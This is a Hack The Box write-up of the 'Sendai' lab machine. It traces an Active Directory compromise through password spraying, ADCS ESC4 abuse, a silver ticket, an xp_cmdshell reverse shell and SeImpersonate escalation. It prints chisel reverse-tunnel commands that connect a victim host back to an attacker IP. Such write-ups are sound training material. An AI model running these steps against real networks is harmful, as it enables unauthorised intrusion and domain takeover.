---
layout: post
title: "Sendai - Hack The Box"
summary: "SMB null session RID brute-force → empty password spray → password update via smbpasswd → elliot.yates credentials → LDAP/BloodHound enumeration → mgtsvc account with WinRM access → hardcoded clifford credentials in non-common process → CA Operators membership → ADCS ESC4 exploitation → administrator hash via certipy"
---

# Sendai - Hack The Box

## Enumeration
### Nmap
Initial nmap scan revealed HTTP and common Domain Controller ports open.

<img width="1080" height="547" alt="00 - nmap" src="https://github.com/user-attachments/assets/cdad17ea-81cb-45c1-bd2a-879a5eae3e42" />

### SMB Null Session
Enumeration of SMB Shares with null session was allowed.

<img width="1245" height="255" alt="01 - smb null" src="https://github.com/user-attachments/assets/847a2c95-42a7-4a68-b8d5-8ab62c761b7c" />

One of the shares included incident.txt file. The file contained a text which explains some of the user accounts has weak passwords.

<img width="1367" height="596" alt="02 - incident" src="https://github.com/user-attachments/assets/f4dad46f-d5b1-4ed4-98e2-aa641941f538" />

### Brute Forcing
Because null session had READ access to the IPC$ share, I could brute force rid to create a user list. 

<img width="1489" height="834" alt="04 - rid brute" src="https://github.com/user-attachments/assets/209c411c-cfb9-4f92-b852-93c0e1d9f076" />

Then with the generated user list, I applied empty password brute forcing.

<img width="1239" height="513" alt="06 - brute force empty" src="https://github.com/user-attachments/assets/d5ca2861-84c1-42b2-a52a-5fa1df1381e0" />

Two account's status was PASSWORD MUST CHANGE, so I updated one of the user's password using impacket's smbpasswd.py

<img width="786" height="220" alt="07 - update password smbpasswd py" src="https://github.com/user-attachments/assets/1b0a5438-82bc-4809-bf8b-91a49a64de03" />

### SMB Enumeration
Later, with the new credentials I enumerated SMB shares again. This time I could access more shares.

<img width="1233" height="257" alt="08 - elliot shares" src="https://github.com/user-attachments/assets/9336e074-1933-454d-b990-6c18e6da61ef" />

The config share included mssql service accounts password. However, MSSQL port was closed on the target.

<img width="806" height="292" alt="09 - mssql" src="https://github.com/user-attachments/assets/6084407a-a606-4ff7-a482-40b040d598e7" />

### BloodHound
Later, I checked if I can access LDAP using sqlsvc account. After finding out I can, I ran bloodhound-python.

<img width="1078" height="506" alt="10 - bloodhound python" src="https://github.com/user-attachments/assets/49992352-8c79-4531-ab12-3aae46ba5afe" />

Checking the BloodHound revealed that Elliot.Yates (the user whom password was updated) can obtain the mgtsvc$ account which can winRM to the DC.

<img width="1151" height="411" alt="11 - mgmtsvc" src="https://github.com/user-attachments/assets/fb846825-e9cd-4684-90c7-3dd06d3ab54a" />

So I applied necessary steps and got the winRM shell.

<img width="973" height="396" alt="12 - mgmtsvc" src="https://github.com/user-attachments/assets/93dc1c60-467d-4b9e-ae73-43f17d67812d" />

<img width="1090" height="256" alt="13 - login" src="https://github.com/user-attachments/assets/70e2c98c-0ba5-4445-90a2-9e787d7e3dd7" />

## Privilege Escalation
### 1st Way
I ran the Invoke-PrivEscCheck.

<img width="773" height="154" alt="14 - PrivescCheck" src="https://github.com/user-attachments/assets/7bdfc47f-818c-4fab-a44e-e5bce1c3e585" />

The output showed that one of the non-common processes running on the target had hardcoded credentials.

<img width="718" height="106" alt="15 - cleartext clifford" src="https://github.com/user-attachments/assets/4ce6f6cd-6af1-4792-a96b-9f006ec73f93" />

And checking that user on the bloodhound revealed that the user was in the CA Operators group.

<img width="767" height="582" alt="16 - CA Operators" src="https://github.com/user-attachments/assets/029d6d2a-e8e9-4a1b-923e-61dcfea6a505" />

So I ran certipy to check if there were any vulnerable templates.

<img width="902" height="289" alt="17 - certipy" src="https://github.com/user-attachments/assets/58f83b5a-0aa7-415c-beb4-5d8a94172e1e" />

One of the templates was vulnerable to ESC4.

<img width="953" height="767" alt="18 - vulnerable" src="https://github.com/user-attachments/assets/c25779e4-81dd-4256-aa76-a04b2a443f46" />

So simply applied necessary steps to get the administrator hash.

<img width="1442" height="462" alt="19 - add ESC1 to template" src="https://github.com/user-attachments/assets/ade80b23-8c43-4593-b5f4-52e9270ab36c" />

<img width="984" height="525" alt="20 - got the admin hash" src="https://github.com/user-attachments/assets/9d0187d9-fbda-4d53-9ece-cf005c14ede1" />

Then using the hash, I applied pass the hash to get the root flag.

<img width="1120" height="233" alt="21 - got the root" src="https://github.com/user-attachments/assets/b6fb5211-ef3c-48bf-9aaf-3c112706ac3b" />

### 2nd Way
The C:\ directory included SQL2019 directory, so I tried to run sqlcmd. But there were no useful databases and current_user was guest.

<img width="1051" height="102" alt="22 - 2nd way checkin sql user" src="https://github.com/user-attachments/assets/14aa2905-c099-4d35-99ca-d5391e7001cf" />

However, I know the password of the sql service account. Thus, I can apply silver ticket attack to generate an Administrator ticket to access mssql service as dbadmin.

First I checked the SPN of the sqlsvc user.

<img width="719" height="242" alt="23 - spn" src="https://github.com/user-attachments/assets/d3a37330-096c-4a43-a578-972925405478" />

Then generated NTLM hash from the cleartext password. And applied silver ticket attack using impacket-ticketer.

<img width="1612" height="278" alt="24 - silver ticket" src="https://github.com/user-attachments/assets/75b27684-951b-42af-a395-4880eddd68fb" />

Now there was a problem, I can't login to the target service because it is internal. I need to apply portforwarding. So I used chisel and applied below steps:
1. Update the `/etc/proxychains4.conf`
    ```powershell
    #socks4 127.0.0.1 9050
    socks5  127.0.0.1 1080
    ```
2. Set Reverse Listener on attacker site:
    ```bash
    chisel server --reverse --port 443
    ```
3. Set client on the victim side:
    ```bash
    chisel.exe client 10.10.16.11:443 R:socks
    ```
4. Now we can access the internal network.

So I used impacket-mssqlclient with the generated ticket to get an intercative SQL shell. Then while listening with netcat, I ran a reverse shell using xp_cmdshell.

<img width="1632" height="511" alt="26 - mssqlclient" src="https://github.com/user-attachments/assets/2c428b06-a81f-415f-868c-b2d524d5272d" />

I got the shell as sqlsvc user. The user had SeImpersontaePrivileges.

<img width="834" height="391" alt="27 - seimpersonate" src="https://github.com/user-attachments/assets/74092682-aefb-4ce5-8cd8-b3ad7394a389" />

I used SigmaPatato to abuse SeImpersonatePrivileges and got a system shell.

<img width="727" height="82" alt="28 - sigma patato" src="https://github.com/user-attachments/assets/8019523f-949c-4e76-9782-9504cbc6deea" />

<img width="614" height="140" alt="29 - got the system" src="https://github.com/user-attachments/assets/f431cb89-3d37-4e99-b247-935efd499b2b" />

## Pwned
The machine wass fully compromised.

<img width="719" height="696" alt="PWNED" src="https://github.com/user-attachments/assets/cf775bfa-fa9d-483c-84f2-5cedec9ef19d" />

